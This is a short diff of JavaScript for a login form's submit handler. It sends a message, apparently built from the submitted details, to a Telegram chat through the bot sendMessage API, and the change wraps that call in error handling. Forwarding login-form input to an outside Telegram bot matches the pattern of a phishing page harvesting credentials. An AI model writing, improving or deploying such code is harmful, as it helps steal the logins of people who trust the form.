@@ -11,18 +11,23 @@ document.getElementById('loginForm').addEventListener('submit', async function (
 
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-  const response = await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-    }),
-  });
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      }),
+    });
 
-  if (response.ok) {
-    alert('Details submitted successfully!');
-  } else {
-    alert('Failed to submit details.');
+    if (response.ok) {
+      alert('Details submitted successfully!');
+    } else {
+      alert('Failed to submit details.');
+    }
+  } catch (error) {
+    console.error('Error:', error);
+    alert('An error occurred. Check the console for details.');
   }
 });
